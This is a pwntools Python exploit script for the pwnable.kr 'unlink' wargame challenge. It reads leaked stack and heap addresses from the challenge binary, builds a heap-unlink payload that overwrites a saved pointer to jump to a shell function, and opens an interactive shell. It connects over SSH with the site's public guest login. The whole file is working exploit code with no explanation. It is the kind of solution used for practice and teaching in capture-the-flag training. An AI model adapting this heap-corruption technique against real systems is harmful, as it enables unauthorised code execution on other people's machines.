#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
import sys
context.log_level = "debug"

io = process("./unlink") if sys.argv[1] == "l" else \
        ssh(user = "unlink", host = "pwnable.kr", port = 2222, password = "guest").process("./unlink")
shell_addr = 0x080484eb

io.recvuntil("leak: ")
stack_addr = int(io.recvuntil("\n", drop = True), 16)
io.recvuntil("leak: ")
heap_addr = int(io.recvuntil("\n", drop = True), 16)

target_addr = stack_addr + 0x10

payload = p32(shell_addr) + cyclic(12) + p32(heap_addr + 12) + p32(target_addr)
io.sendlineafter("shell!\n", payload)

io.interactive()
io.close()
